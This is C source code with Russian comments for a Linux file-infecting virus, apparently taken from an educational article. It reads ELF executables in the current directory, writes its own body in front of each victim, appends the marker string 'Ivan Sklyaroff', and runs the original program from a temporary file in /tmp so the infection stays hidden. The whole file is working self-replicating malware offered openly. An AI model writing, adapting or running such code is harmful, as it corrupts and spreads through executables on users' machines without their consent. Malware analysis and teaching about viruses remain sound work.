#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>

#define VIRUS_LENGTH 5296 // здесь укажите правильную длину скомпилированного инфектора
#define TMP_FILE "/tmp/body.tmp"
#define MAX_VICTIMS 1 // максимальное число заражаемых файлов за 1 раз
#define INFECTED "Ivan Sklyaroff" // метка зараженного файла

char *body, *newbody, *virbody;
int fd, len, icount;
struct stat status;
Elf32_Ehdr ehdr; 



infect(char *victim)

{
  char belf[4] = {'\x7f','E','L','F'};
  char buf[64];

  /* считываем ELF-заголовок жертвы */
  fd = open(victim, O_RDWR , status.st_mode);
  read(fd, &ehdr,sizeof(ehdr));

  /* проверяем является ли жертва исполняемым ELF-файлом */
  if (strncmp(ehdr.e_ident, belf, 4) != 0)
    return; // выходим из функции, если жертва не ELF-файл
  if (ehdr.e_type != ET_EXEC)
    return; // выходим из функции, если жертва не исполняемый файл

  /* читаем тело жертвы и сохраняем его в буфер */
  fstat(fd, &status);
  lseek(fd, 0, SEEK_SET);
  newbody = malloc(status.st_size);
  read(fd, newbody, status.st_size);

  /* считываем в конце тела жертвы метку зараженного файла */
  lseek(fd, status.st_size - sizeof(INFECTED), SEEK_SET);
    
  read(fd, &buf, sizeof(INFECTED));

  /* если метка присутствует, то следовательно файл уже заражен, 
  поэтому выходим из функции */
  if (strncmp(buf, INFECTED, sizeof(INFECTED)) == 0)
    return;
  
  /* записываем тело вируса в начало файла */    
  lseek(fd, 0, SEEK_SET);
  write(fd, virbody, VIRUS_LENGTH);
  /* после записываем тело жертвы */
  write(fd, newbody, status.st_size);
  /* в конце вставляем метку зараженного файла */
  write(fd, INFECTED, sizeof(INFECTED));
  close(fd);
 // закрываем зараженный файл

  icount++;
 // увеличиваем счетчик зараженных файлов

  printf("%s infected!\n", victim);
}



find_victim()

{
  DIR *dir_ptr;

  struct dirent *d;
  char dir[100];

  getcwd(dir, 100); // получаем текущую директорию
  dir_ptr = opendir(dir);
 // открываем текущую директорию

  /* читаем пока есть элементы (файлы) */
  while (d = readdir(dir_ptr))
  {
    if (d->d_ino != 0) {
      if (icount < MAX_VICTIMS) // проверяем счетчик заражений
        infect(d->d_name); // вызываем функцию заражения
    }
  }
}


int main(int argc, char *argv[], char **envp)

{
  /* открываем сами себя и вычисляем длину */
  fd = open(argv[0], O_RDONLY);
  fstat(fd, &status);



  lseek(fd, 0, 0);


  /* читаем свое тело и сохраняем его в буфер */
  virbody = malloc(VIRUS_LENGTH);
  read(fd, virbody, VIRUS_LENGTH);

  /* проверяем свою длину */
  if (status.st_size != VIRUS_LENGTH)
 {
  
  /* запущен зараженный файл, поэтому 
    отделяем тело оригинальной программы от инфектора */
    len = status.st_size - VIRUS_LENGTH;



    lseek(fd, VIRUS_LENGTH, 0);
    body = malloc(len);
    read(fd, body, len);
    close(fd);
    
    /* сохраняем тело оригинальной программы в промежуточный файл */
    fd = open(TMP_FILE, O_RDWR|O_CREAT|O_TRUNC, status.st_mode);
    write(fd, body, len);
    close(fd);
    /* запускаем оригинальную программу на выполнение */
    if (fork() == 0) wait();
    else execve(TMP_FILE, argv, envp);
    /* удаляем промежуточный файл */
    unlink(TMP_FILE);
  }

  /* поиск жертвы и ее заражение */
  find_victim();

  
  /* выходим из инфектора */
  close(fd);
  exit(0);


}


